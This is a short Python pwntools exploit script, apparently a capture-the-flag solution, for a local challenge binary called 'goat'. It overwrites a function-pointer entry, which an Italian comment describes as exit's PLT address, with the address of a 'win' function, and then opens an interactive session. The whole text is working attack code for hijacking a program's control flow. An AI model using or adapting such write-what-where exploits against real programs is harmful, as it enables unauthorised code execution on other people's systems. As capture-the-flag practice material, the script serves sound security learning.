from pwn import *

p = process('./goat')
elf = ELF('./goat')

where = hex(0x804c018) #indirizzo della plt di exit
what = hex(0x080491c6) #indirizzo di win

p.sendline(where)
p.sendline(what)
p.interactive()

